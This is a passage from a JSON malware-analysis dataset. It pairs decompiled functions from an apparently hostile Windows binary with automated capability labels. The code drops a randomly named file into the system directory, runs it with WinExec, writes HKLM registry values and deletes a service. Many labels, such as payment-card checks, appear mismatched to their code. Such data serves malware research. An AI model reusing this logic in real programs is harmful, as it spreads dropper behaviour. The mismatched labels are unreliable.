        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040181f) overlaps instruction at (ram,0x0040181a)\n// \n\nint32_t __cdecl fcn.004017c0(uint32_t arg_8h, uint16_t *arg_ch, uint32_t arg_10h)\n\n{\n    bool bVar1;\n    \n    if (arg_10h != 0) {\n        do {\n            bVar1 = (POPCOUNT(arg_10h & 0xff) & 1U) == 0;\n            if ((bVar1) || (!bVar1)) {\n                arg_10h = *arg_ch;\n            }\n            *0x34a96c7f = *0x34a96c7f << 2;\n            arg_8h = arg_ch + arg_8h + 1;\n            if (arg_8h >> 0x10 != 0) {\n                arg_8h = (arg_8h >> 0x10) + (arg_8h & 0xffff);\n            }\n            arg_ch = arg_10h + 2;\n            arg_10h = *(*0x3317b43a + 8) - 1;\n            *(*0x3317b43a + 8) = arg_10h;\n        } while (arg_10h != 0);\n    }\n    return (arg_8h >> 0x10) + arg_8h;\n}\n",
        "token_count": 317
    },
    "00404130": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004041b3) overlaps instruction at (ram,0x004041b1)\n// \n\nuint64_t __cdecl fcn.00404130(uint Base, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    uint16_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    uchar *puVar7;\n    uint32_t unaff_ESI;\n    int32_t iVar8;\n    bool bVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    \n    puVar5 = &stack0xfffffffc;\n    uVar3 = fcn.004017c0(0, Base, arg_ch + 1U >> 1);\n    uVar4 = unaff_ESI & 0xffff0000 | unaff_ESI + 1;\n    bVar9 = uVar4 < 0x222c;\n    bVar10 = uVar4 == 0x222c;\n    uVar11 = (*_sym.imp.dbghelp.dll_ImageNtHeader)();\n    uVar4 = uVar11 >> 0x20;\n    if ((bVar9 || bVar10) || (!bVar9 && !bVar10)) {\n        uVar4 = *(uVar11 + 0x58);\n    }\n    else {\n        piVar1 = uVar3 - 0x75;\n        *piVar1 = *piVar1 - &stack0xffffffec;\n        bVar10 = *piVar1 == 0;\n    }\n    puVar7 = &stack0xfffffffc;\n    if ((!bVar10) && (puVar7 = &stack0xfffffffc,  bVar10)) {\n        puVar6 = &stack0xffffffe8;\n        puVar7 = &stack0xffffffe8;\n        cVar2 = '\\x10';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar6 = puVar6 + -1;\n            *puVar6 = *puVar5;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    if (uVar3 < uVar4) {\n        iVar8 = (uVar3 - uVar4 & 0xffff) - 1;\n    }\n    else {\n        iVar8 = uVar3 - (uVar4 & 0xffff);\n    }\n    if (iVar8 < uVar4 >> 0x10) {\n        iVar8 = (iVar8 - (uVar4 >> 0x10) & 0xffff) - 1;\n    }\n    else {\n        iVar8 = iVar8 - (uVar4 >> 0x10);\n    }\n    piVar1 = *(puVar7 + 0x14);\n    *piVar1 = iVar8 + *(puVar7 + 0xc);\n    **(puVar7 + 0x10) = *(uVar11 + 0x58);\n    return uVar11 & 0xffffffff | ((piVar1 >> 8 & 0xffff00) << 8 | piVar1 & 0xffff) << 0x20;\n}\n",
        "token_count": 720
    },
    "004019b0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004019dd)\n// WARNING: Removing unreachable block (ram,0x004019e7)\n\nbool __cdecl fcn.004019b0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404470();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.004049a0();\n        arg_ch_01 = fcn.004049a0();\n        arg_ch_02 = fcn.004049a0();\n        fcn.00401c40(arg_10h, arg_ch_00);\n        fcn.00401c40(arg_8h, arg_ch_01);\n        fcn.00401c40(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x407024, &lpBuffer, arg_10h);\n        iVar2 = fcn.004018f0(&var_314h);\n        if (iVar2 != 0) {\n            (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_8h);\n            iVar2 = fcn.004018f0(&var_210h);\n            if (iVar2 != 0) {\n                (*pcVar1)(&var_210h, 0x407030, &lpBuffer, arg_ch);\n                iVar2 = fcn.004018f0(&var_210h);\n                if (iVar2 != 0) {\n                    iVar2 = 1;\n                    break;\n                }\n            }\n        }\n        var_4h = var_4h + 1;\n        iVar2 = var_8h;\n    } while (var_4h < 3);\n    fcn.00401c40(arg_14h, 4);\n    return iVar2 != 0;\n}\n",
        "token_count": 647
    },
    "00401b10": {
        "rules": [
            "encrypt data using Curve25519/98eda359275044f0933c6ca58186cb36"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nbool fcn.00401b10(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint unaff_EBX;\n    uint unaff_EDI;\n    char *pcVar4;\n    char *var_4h;\n    \n    var_4h = NULL;\n    iVar2 = fcn.00401090(&var_4h, unaff_EDI, unaff_EBX, 0);\n    if (iVar2 == 0) {\n        return false;\n    }\n    if (var_4h == NULL) {\n        return false;\n    }\n    uVar3 = 0xffffffff;\n    pcVar4 = var_4h;\n    do {\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        cVar1 = *pcVar4;\n        pcVar4 = pcVar4 + 1;\n    } while (cVar1 != '\\0');\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x407218, 1, var_4h, ~uVar3 - 1);\n    return iVar2 == 0;\n}\n",
        "token_count": 290
    },
    "00402000": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00402000(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x42240c == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1284);\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1812, 0x104);\n    fcn.00401c40(&uStack2112, 6);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x4072e4, acStack1304, &uStack2112);\n    uStack2088 = 0x40736c;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x407384;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401000(auStack1564, 0x4072e0, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1868
    },
    "004048b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid fcn.004048b0(uint param_1)\n\n{\n    uint uStack48;\n    uint uStack44;\n    code *pcStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint uStack8;\n    uint uStack4;\n    \n    uStack48 = 0x30;\n    uStack44 = 3;\n    pcStack40 = fcn.00401ba0;\n    uStack36 = 0;\n    uStack32 = 0;\n    uStack28 = param_1;\n    uStack24 = 0;\n    uStack20 = 0;\n    uStack16 = 0;\n    uStack12 = 0;\n    uStack8 = 0x4223fc;\n    uStack4 = 0;\n    (*_sym.imp.USER32.dll_RegisterClassExA)(&uStack48);\n    return;\n}\n",
        "token_count": 219
    },
    "00401000": {
        "rules": [
            "create or open file",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401000(uint filename, uint mode, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    \n    // [00] -r-x section size 20480 named .text\n    iVar1 = (*_sym.imp.MSVCRT.dll_fopen)(filename, mode);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.MSVCRT.dll_fwrite)(arg_10h, 1, arg_14h, iVar1);\n    (*_sym.imp.MSVCRT.dll_fflush)(iVar1);\n    (*_sym.imp.MSVCRT.dll_fclose)(iVar1);\n    return 1;\n}\n",
        "token_count": 158
    },
    "00403d70": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403d70(uint arg_8h)\n\n{\n    (*_sym.imp.KERNEL32.dll_CreateFileA)(arg_8h, 0xc0000000, 1, 0, 3, 0x80, 0);\n    return;\n}\n",
        "token_count": 79
    },
    "00401420": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401420(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint8_t in_CL;\n    uint8_t in_DL;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    bool bVar5;\n    uint auStack24 [2];\n    \n    puVar2 = &stack0xfffffffc;\n    iVar4 = 0;\n    if (0 < arg_14h) {\n        do {\n            bVar5 = (POPCOUNT((in_CL ^ 0xdd) + 1 ^ in_DL) & 1U) != 0;\n            if ((bVar5) && (!bVar5)) {\n                puVar3 = auStack24 + 1;\n                cVar1 = '\\x1e';\n                do {\n                    puVar2 = puVar2 + -1;\n                    puVar3 = puVar3 + -1;\n                    *puVar3 = *puVar2;\n                    cVar1 = cVar1 + -1;\n                } while ('\\0' < cVar1);\n                iVar4 = in(0x78);\n                return iVar4;\n            }\n            in_CL = *(iVar4 + arg_10h) ^ *(iVar4 % arg_ch + arg_8h);\n            in_DL = arg_14h ^ in_CL;\n            *(iVar4 + arg_10h) = in_DL;\n            iVar4 = iVar4 + 1;\n            in_EAX = arg_8h;\n        } while (iVar4 < arg_14h);\n    }\n    return in_EAX;\n}\n",
        "token_count": 379
    },
    "004014b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004014b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00403bf0(arg_8h, 1);\n    return iVar1 != 0;\n}\n",
        "token_count": 54
    },
    "00401870": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004018db) overlaps instruction at (ram,0x004018d9)\n// \n// WARNING: Removing unreachable block (ram,0x004018b5)\n\nvoid __cdecl fcn.00401870(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_14h != 0) {\n        do {\n            uVar1 = *(uVar2 + arg_10h) ^ *(uVar2 % arg_ch + arg_8h);\n            if ((uVar1 < '\\0') || (uVar1 >= '\\0')) {\n                *(uVar2 + arg_10h) = uVar1;\n                uVar2 = uVar2 + 1;\n            }\n        } while (uVar2 < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 224
    },
    "00401940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401970) overlaps instruction at (ram,0x0040196e)\n// \n\nuint32_t __cdecl fcn.00401940(uint arg_8h, uint arg_ch)\n\n{\n    uint Base;\n    uint arg_ch_00;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    bool bVar3;\n    ulong uVar4;\n    \n    arg_ch_00 = arg_ch;\n    Base = arg_8h;\n    uVar4 = fcn.00404130(arg_8h, arg_ch, &arg_8h, &arg_ch);\n    uVar2 = uVar4 >> 0x20;\n    uVar1 = uVar4;\n    bVar3 = false;\n    if (uVar1 == 0) {\n        return 0;\n    }\n    if ((uVar1 < 0) || (uVar1 >= 0)) {\n        *(uVar1 + 0x58) = arg_ch;\n    }\n    else {\n        bVar3 = uVar2 < 0x890c558b;\n        uVar1 = uVar2;\n    }\n    if (!bVar3) {\n        if (bVar3) {\n            out(0xbd, uVar1);\n            return uVar1;\n        }\n    }\n    fcn.00404130(Base, arg_ch_00, &arg_8h, &arg_ch);\n    return 1;\n}\n",
        "token_count": 320
    },
    "00401ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401c02) overlaps instruction at (ram,0x00401c00)\n// \n\nvoid __cdecl fcn.00401ba0(uint arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t extraout_EDX;\n    int32_t unaff_EBX;\n    bool bVar1;\n    uchar uVar2;\n    \n    if (arg_ch == 1) {\n        fcn.004022e0();\n        bVar1 = false;\n        uVar2 = 0;\n        fcn.00402f50();\n        if ((!bVar1) && (bVar1)) {\n            uVar2 = unaff_EBX + *(unaff_EBX + 0x69 + extraout_EDX * 4) + bVar1 < 0;\n        }\n        fcn.00403900();\n        if ((uVar2) || (!uVar2)) {\n            if (*0x422408 != 0) goto code_r0x00401c18;\n            (*_sym.imp.USER32.dll_PostQuitMessage)(0);\n        }\n        fcn.00402000();\n    }\ncode_r0x00401c18:\n    (*_sym.imp.USER32.dll_DefWindowProcA)(arg_8h, arg_ch, arg_10h, arg_14h);\n    return;\n}\n",
        "token_count": 306
    },
    "00401c40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encode data using XOR"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401c40(int32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    if (arg_ch != 0) {\n        do {\n            iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n            *(uVar2 + arg_8h) = iVar1 % 0x1a + 'a';\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch);\n    }\n    return;\n}\n",
        "token_count": 131
    },
    "00401f50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401f7a) overlaps instruction at (ram,0x00401f79)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __fastcall fcn.00401f50(int32_t param_1, uint32_t param_2)\n\n{\n    uchar *puVar1;\n    uchar uVar2;\n    char cVar3;\n    char *in_EAX;\n    int32_t iVar4;\n    uint uVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    uint32_t uVar8;\n    char **ppcVar9;\n    uint32_t unaff_EBX;\n    uint *puVar10;\n    int32_t *unaff_EDI;\n    char *pcVar11;\n    char *pcVar12;\n    char *pcVar13;\n    uint *puVar14;\n    bool in_CF;\n    bool in_ZF;\n    bool in_OF;\n    unkbyte5 in_stack_00000003;\n    uint uStack2128;\n    int32_t *piStack2124;\n    char *apcStack2112 [2];\n    uint uStack2104;\n    char acStack2101 [2];\n    uint uStack2099;\n    ushort uStack2095;\n    uchar uStack2093;\n    uchar uStack2080;\n    uint uStack2079;\n    uchar auStack1840 [12];\n    uchar auStack1828 [8];\n    uchar uStack1820;\n    uint uStack1819;\n    uchar auStack1580 [260];\n    char acStack1320 [20];\n    uchar auStack1300 [239];\n    char acStack1061 [21];\n    uchar uStack1040;\n    uint uStack1039;\n    int32_t *piStack68;\n    ushort uStack18;\n    \n    if (!in_OF) {\n        uStack18 = param_2;\n        param_2 = param_2 & 0xffff;\n        if (in_OF) {\n            piStack2124 = unaff_EDI + 1;\n            uVar2 = in(uStack18);\n            *unaff_EDI = uVar2;\n            unaff_EDI = piStack2124;\n            if (!in_CF && !in_ZF) {\n                *in_EAX = *in_EAX + in_EAX;\n                apcStack2112[0] = unaff_EBX & 0xffff0000 | CONCAT11((unaff_EBX >> 8) + (param_2 >> 8), 0xbc);\n                puVar1 = (in_EAX & 0xffffff00 | in_EAX + 0x9f) - 0x3c;\n                *puVar1 = *puVar1;\n                if (*0x42240c == 0) {\n                    return 0;\n                }\n                uStack2104 = 0;\n                acStack2101[1] = 0;\n                uStack2099 = 0;\n                uStack2095 = 0;\n                uStack2093 = 0;\n                uStack2080 = 0;\n                puVar10 = &uStack2079;\n                for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                *puVar10 = 0;\n                *(puVar10 + 2) = 0;\n                uStack1820 = 0;\n                puVar10 = &uStack1819;\n                for (iVar4 = 0x40; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                *puVar10 = 0;\n                *(puVar10 + 2) = 0;\n                uStack1040 = 0;\n                puVar10 = &uStack1039;\n                for (iVar4 = 0xff; iVar4 != 0; iVar4 = iVar4 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                *puVar10 = 0;\n                uStack2128 = 0x104;\n                apcStack2112[1] = NULL;\n                *(puVar10 + 2) = 0;\n                (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(auStack1300);\n                (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)(0, auStack1828, 0x104);\n                fcn.00401c40(&uStack2128, 6);\n                (*_sym.imp.MSVCRT.dll_sprintf)(auStack1580, 0x4072e4, acStack1320, &uStack2128);\n                apcStack2112[0] = 0x40735c;\n                apcStack2112[1] = 0x407360;\n                uStack2104 = 0x40736c;\n                ppcVar9 = apcStack2112;\n                iVar4 = 3;\n                do {\n                    pcVar12 = acStack2101;\n                    uVar6 = 0xffffffff;\n                    do {\n                        pcVar12 = pcVar12 + 1;\n                        if (uVar6 == 0) break;\n                        uVar6 = uVar6 - 1;\n                    } while (*pcVar12 != '\\0');\n                    pcVar12 = *ppcVar9;\n                    ppcVar9 = ppcVar9 + 1;\n                    acStack2101[~uVar6] = '\\n';\n                    uVar6 = 0xffffffff;\n                    do {\n                        pcVar11 = pcVar12;\n                        if (uVar6 == 0) break;\n                        uVar6 = uVar6 - 1;\n                        pcVar11 = pcVar12 + 1;\n                        cVar3 = *pcVar12;\n                        pcVar12 = pcVar11;\n                    } while (cVar3 != '\\0');\n                    uVar6 = ~uVar6;\n                    iVar7 = -1;\n                    pcVar12 = acStack2101 + 1;\n                    do {\n                        pcVar13 = pcVar12;\n                        if (iVar7 == 0) break;\n                        iVar7 = iVar7 + -1;\n                        pcVar13 = pcVar12 + 1;\n                        cVar3 = *pcVar12;\n                        pcVar12 = pcVar13;\n                    } while (cVar3 != '\\0');\n                    puVar10 = pcVar11 + -uVar6;\n                    puVar14 = pcVar13 + -1;\n                    for (uVar8 = uVar6 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                        *puVar14 = *puVar10;\n                        puVar10 = puVar10 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                    iVar4 = iVar4 + -1;\n                    for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                        *puVar14 = *puVar10;\n                        puVar10 = puVar10 + 1;\n                        puVar14 = puVar14 + 1;\n                    }\n                } while (iVar4 != 0);\n                (*_sym.imp.MSVCRT.dll_sprintf)\n                          (acStack1061 + 1, acStack2101 + 1, auStack1840, auStack1840, acStack1320[0]);\n                pcVar12 = acStack1061;\n                uVar6 = 0xffffffff;\n                do {\n                    pcVar12 = pcVar12 + 1;\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                } while (*pcVar12 != '\\0');\n                acStack1061[~uVar6] = '\\n';\n                uVar6 = 0xffffffff;\n                pcVar12 = 0x407384;\n                do {\n                    pcVar11 = pcVar12;\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                    pcVar11 = pcVar12 + 1;\n                    cVar3 = *pcVar12;\n                    pcVar12 = pcVar11;\n                } while (cVar3 != '\\0');\n                uVar6 = ~uVar6;\n                iVar4 = -1;\n                pcVar12 = acStack1061 + 1;\n                do {\n                    pcVar13 = pcVar12;\n                    if (iVar4 == 0) break;\n                    iVar4 = iVar4 + -1;\n                    pcVar13 = pcVar12 + 1;\n                    cVar3 = *pcVar12;\n                    pcVar12 = pcVar13;\n                } while (cVar3 != '\\0');\n                puVar10 = pcVar11 + -uVar6;\n                puVar14 = pcVar13 + -1;\n                for (uVar8 = uVar6 >> 2; uVar8 != 0; uVar8 = uVar8 - 1) {\n                    *puVar14 = *puVar10;\n                    puVar10 = puVar10 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                for (uVar6 = uVar6 & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n                    *puVar14 = *puVar10;\n                    puVar10 = puVar10 + 1;\n                    puVar14 = puVar14 + 1;\n                }\n                pcVar12 = acStack1061;\n                uVar6 = 0xffffffff;\n                do {\n                    pcVar12 = pcVar12 + 1;\n                    if (uVar6 == 0) break;\n                    uVar6 = uVar6 - 1;\n                } while (*pcVar12 != '\\0');\n                iVar4 = fcn.00401000(auStack1580, 0x4072e0, acStack1061 + 1, ~uVar6 - 1);\n                if (iVar4 == 0) {\n                    return 0;\n                }\n                (*_sym.imp.KERNEL32.dll_WinExec)(auStack1580, 0);\n                return 1;\n            }\n            goto code_r0x00401f6f;\n        }\n    }\n    param_1 = in_stack_00000003 >> 8;\ncode_r0x00401f6f:\n    *0x8b0c458a = *0x8b0c458a | param_1 >> 8;\n    *unaff_EDI = *unaff_EDI + param_1;\n    *0x8b0c45dc = *0x8b0c45dc + param_2;\n    iVar4 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)();\n    if (iVar4 == 0) {\n        return 0;\n    }\n    uVar5 = (*_sym.imp.ADVAPI32.dll_DeleteService)();\n    piStack68 = unaff_EDI;\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar5;\n}\n",
        "token_count": 2465
    },
    "00401fd0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nbool fcn.00401fd0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4071d8, 0x40721c, 4, &stack0x00000004, 4);\n    return iVar1 == 0;\n}\n",
        "token_count": 81
    },
    "00402210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
